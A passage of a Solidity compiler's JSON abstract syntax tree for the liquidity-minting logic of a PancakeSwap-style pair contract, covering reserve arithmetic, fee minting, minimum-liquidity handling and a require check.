												"nodeType": "VariableDeclarationStatement",
												"src": "5191:38:6"
											},
											{
												"assignments": [
													1413
												],
												"declarations": [
													{
														"constant": false,
														"id": 1413,
														"name": "amount1",
														"nodeType": "VariableDeclaration",
														"scope": 1511,
														"src": "5239:12:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1412,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5239:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1418,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1416,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1379,
															"src": "5267:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1414,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1395,
															"src": "5254:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1415,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sub",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 2239,
														"src": "5254:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
															"typeString": "function (uint256,uint256) pure returns (uint256)"
														}
													},
													"id": 1417,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5254:23:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5239:38:6"
											},
											{
												"assignments": [
													1420
												],
												"declarations": [
													{
														"constant": false,
														"id": 1420,
														"name": "feeOn",
														"nodeType": "VariableDeclaration",
														"scope": 1511,
														"src": "5288:10:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1419,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "5288:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1425,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1422,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1377,
															"src": "5310:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1423,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1379,
															"src": "5321:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1421,
														"name": "_mintFee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1367,
														"src": "5301:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint112_$_t_uint112_$returns$_t_bool_$",
															"typeString": "function (uint112,uint112) returns (bool)"
														}
													},
													"id": 1424,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5301:30:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5288:43:6"
											},
											{
												"assignments": [
													1427
												],
												"declarations": [
													{
														"constant": false,
														"id": 1427,
														"name": "_totalSupply",
														"nodeType": "VariableDeclaration",
														"scope": 1511,
														"src": "5341:17:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1426,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5341:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1429,
												"initialValue": {
													"argumentTypes": null,
													"id": 1428,
													"name": "totalSupply",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 19,
													"src": "5361:11:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5341:31:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1432,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1430,
														"name": "_totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1427,
														"src": "5464:12:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1431,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5480:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "5464:17:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 1472,
													"nodeType": "Block",
													"src": "5685:169:6",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1470,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1454,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1374,
																	"src": "5699:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1462,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1459,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1427,
																						"src": "5749:12:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 1457,
																						"name": "amount0",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1406,
																						"src": "5737:7:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1458,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2267,
																					"src": "5737:11:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1460,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "5737:25:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1461,
																				"name": "_reserve0",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1377,
																				"src": "5765:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "5737:37:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1468,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1465,
																						"name": "_totalSupply",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1427,
																						"src": "5804:12:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"id": 1463,
																						"name": "amount1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1413,
																						"src": "5792:7:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1464,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2267,
																					"src": "5792:11:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 1466,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "5792:25:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "/",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1467,
																				"name": "_reserve1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1379,
																				"src": "5820:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint112",
																					"typeString": "uint112"
																				}
																			},
																			"src": "5792:37:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"id": 1455,
																			"name": "Math",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 928,
																			"src": "5711:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																				"typeString": "type(library Math)"
																			}
																		},
																		"id": 1456,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "min",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 873,
																		"src": "5711:8:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1469,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "5711:132:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5699:144:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1471,
															"nodeType": "ExpressionStatement",
															"src": "5699:144:6"
														}
													]
												},
												"id": 1473,
												"nodeType": "IfStatement",
												"src": "5460:394:6",
												"trueBody": {
													"id": 1453,
													"nodeType": "Block",
													"src": "5483:196:6",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1444,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1433,
																	"name": "liquidity",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1374,
																	"src": "5497:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1442,
																			"name": "MINIMUM_LIQUIDITY",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 955,
																			"src": "5545:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"id": 1438,
																							"name": "amount1",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1413,
																							"src": "5531:7:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						],
																						"expression": {
																							"argumentTypes": null,
																							"id": 1436,
																							"name": "amount0",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1406,
																							"src": "5519:7:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 1437,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"memberName": "mul",
																						"nodeType": "MemberAccess",
																						"referencedDeclaration": 2267,
																						"src": "5519:11:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																							"typeString": "function (uint256,uint256) pure returns (uint256)"
																						}
																					},
																					"id": 1439,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "functionCall",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "5519:20:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1434,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 928,
																					"src": "5509:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$928_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 1435,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 927,
																				"src": "5509:9:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 1440,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "5509:31:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 1441,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2239,
																		"src": "5509:35:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 1443,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "5509:54:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "5497:66:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1445,
															"nodeType": "ExpressionStatement",
															"src": "5497:66:6"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 1448,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "5591:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				}
																			],
																			"id": 1447,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "5583:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 1449,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "5583:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1450,
																		"name": "MINIMUM_LIQUIDITY",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 955,
																		"src": "5595:17:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1446,
																	"name": "_mint",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 125,
																	"src": "5577:5:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,uint256)"
																	}
																},
																"id": 1451,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "5577:36:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1452,
															"nodeType": "ExpressionStatement",
															"src": "5577:36:6"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1477,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1475,
																"name": "liquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1374,
																"src": "5871:9:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1476,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "5883:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "5871:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544",
															"id": 1478,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5886:40:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\""
															},
															"value": "Pancake: INSUFFICIENT_LIQUIDITY_MINTED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\""
															}
														],
														"id": 1474,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "5863:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1479,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5863:64:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1480,
												"nodeType": "ExpressionStatement",
												"src": "5863:64:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1482,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1369,
															"src": "5943:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 1483,
															"name": "liquidity",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1374,
															"src": "5947:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1481,
														"name": "_mint",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 125,
														"src": "5937:5:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,uint256)"
														}
													},
													"id": 1484,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5937:20:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1485,
												"nodeType": "ExpressionStatement",
												"src": "5937:20:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1487,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1384,
															"src": "5976:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1488,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1395,
															"src": "5986:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 1489,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1377,
															"src": "5996:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 1490,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1379,
															"src": "6007:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 1486,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1255,
														"src": "5968:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 1491,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5968:49:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1492,
												"nodeType": "ExpressionStatement",
												"src": "5968:49:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 1493,
													"name": "feeOn",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1420,
													"src": "6031:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1503,
												"nodeType": "IfStatement",
												"src": "6027:47:6",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 1501,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1494,
															"name": "kLast",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 984,
															"src": "6038:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1499,
																	"name": "reserve1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 976,
																	"src": "6065:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1496,
																			"name": "reserve0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 974,
																			"src": "6051:8:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint112",
																				"typeString": "uint112"
																			}
																		],
																		"id": 1495,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "6046:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 1497,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
